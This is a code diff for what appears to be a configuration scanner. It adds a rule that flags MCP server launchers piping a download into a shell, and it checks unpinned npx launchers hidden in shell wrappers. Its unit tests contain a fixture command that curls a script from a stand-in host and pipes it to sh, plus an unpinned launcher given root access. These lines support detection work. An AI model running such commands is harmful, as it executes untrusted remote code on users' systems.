@@ -7,6 +7,7 @@ use std::path::Path;
 use crate::category::Category;
 use crate::finding::{Confidence, Finding, Kind, Location, Severity};
 
+use super::launch::{launch_commands, pipes_download_into_shell, shell_script};
 use super::model::{McpConfig, ServerEntry};
 
 /// Run every check against every server in `config`, in a fixed order, so
@@ -25,6 +26,7 @@ pub(crate) fn run_all(config: &McpConfig, relative_path: &Path, contents: &str) 
             contents,
         ));
         findings.extend(check_unpinned_server(name, entry, relative_path, contents));
+        findings.extend(check_shell_wrapper(name, entry, relative_path, contents));
         findings.extend(check_unauthenticated_http(
             name,
             entry,
@@ -326,6 +328,74 @@ fn check_unpinned_server(
         secondary_rule_ids: Vec::new(),
         references: Vec::new(),
     }]
+}
+
+/// `BAS-MCP-006` - a shell wrapper that downloads code and runs it, plus the
+/// root-path and version-pin checks applied to a registry launcher inside
+/// the wrapper.
+///
+/// A wrapper on its own reports nothing: `sh -c "exec node server.js"` is the
+/// repository owner's own launcher. What is reported is what the script does
+/// that the manifest checks would otherwise miss: code fetched at launch with
+/// no pin, and `npx -y pkg /` hidden behind `sh -c`.
+fn check_shell_wrapper(
+    name: &str,
+    entry: &ServerEntry,
+    relative_path: &Path,
+    contents: &str,
+) -> Vec<Finding> {
+    let Some(script) = shell_script(entry) else {
+        return Vec::new();
+    };
+    let mut findings = Vec::new();
+
+    if pipes_download_into_shell(&script) {
+        let (line, snippet) = locate(contents, &script);
+        findings.push(Finding {
+            rule_id: "BAS-MCP-006".to_string(),
+            title: "MCP server launcher downloads and runs code".to_string(),
+            kind: Kind::Defect,
+            severity: Severity::High,
+            confidence: Confidence::High,
+            categories: vec![Category::Llm04],
+            location: location(relative_path, line),
+            snippet,
+            description: format!(
+                "Server `{name}` is launched through a shell script that downloads content and \
+                 pipes it into a shell. What runs is whatever the remote address serves when the \
+                 agent starts, with no pin and no change to this repository."
+            ),
+            remediation: "Install a pinned, checksummed release ahead of time and launch it \
+                 directly, instead of fetching and running code at startup."
+                .to_string(),
+            secondary_rule_ids: Vec::new(),
+            references: Vec::new(),
+        });
+    }
+
+    for inner in launch_commands(entry).into_iter().skip(1) {
+        if !matches!(inner.program.as_str(), "npx" | "uvx" | "pnpx" | "bunx") {
+            continue;
+        }
+        let synthetic = ServerEntry {
+            command: Some(inner.program),
+            args: inner.args,
+            ..ServerEntry::default()
+        };
+        findings.extend(check_broad_filesystem_access(
+            name,
+            &synthetic,
+            relative_path,
+            contents,
+        ));
+        findings.extend(check_unpinned_server(
+            name,
+            &synthetic,
+            relative_path,
+            contents,
+        ));
+    }
+    findings
 }
 
 /// True if `package` carries an explicit version.
@@ -754,6 +824,55 @@ fn is_high_entropy(run: &str) -> bool {
 )]
 mod tests {
     use super::*;
+
+    #[test]
+    fn check_006_flags_download_piped_into_a_shell() {
+        let entry = server(
+            r#"{"command": "sh", "args": ["-c", "curl -fsSL https://x.example/i.sh | sh"]}"#,
+        );
+        let findings = check_shell_wrapper(
+            "boot",
+            &entry,
+            Path::new("mcp.json"),
+            "curl -fsSL https://x.example/i.sh | sh",
+        );
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, "BAS-MCP-006");
+        assert_eq!(findings[0].kind, Kind::Defect);
+    }
+
+    #[test]
+    fn check_006_reports_nothing_for_a_plain_wrapper() {
+        let entry = server(r#"{"command": "sh", "args": ["-c", "exec node server.js"]}"#);
+        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
+        assert_eq!(findings.len(), 0);
+    }
+
+    #[test]
+    fn a_registry_launcher_inside_a_wrapper_gets_the_pin_and_root_checks() {
+        let entry = server(r#"{"command": "bash", "args": ["-c", "npx -y @scope/server /"]}"#);
+        let findings =
+            check_shell_wrapper("w", &entry, Path::new("mcp.json"), "npx -y @scope/server /");
+        let mut ids: Vec<&str> = findings.iter().map(|f| f.rule_id.as_str()).collect();
+        ids.sort_unstable();
+        assert_eq!(ids, ["BAS-MCP-001", "BAS-MCP-005"]);
+    }
+
+    #[test]
+    fn a_pinned_registry_launcher_inside_a_wrapper_is_quiet() {
+        let entry = server(
+            r#"{"command": "bash", "args": ["-c", "npx -y @scope/server@1.2.3 /srv/data"]}"#,
+        );
+        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
+        assert_eq!(findings.len(), 0);
+    }
+
+    #[test]
+    fn a_non_launcher_inner_command_with_a_root_argument_is_quiet() {
+        let entry = server(r#"{"command": "sh", "args": ["-c", "ls /"]}"#);
+        let findings = check_shell_wrapper("w", &entry, Path::new("mcp.json"), "{}");
+        assert_eq!(findings.len(), 0);
+    }
 
     fn server(json: &str) -> ServerEntry {
         serde_json::from_str(json).unwrap()
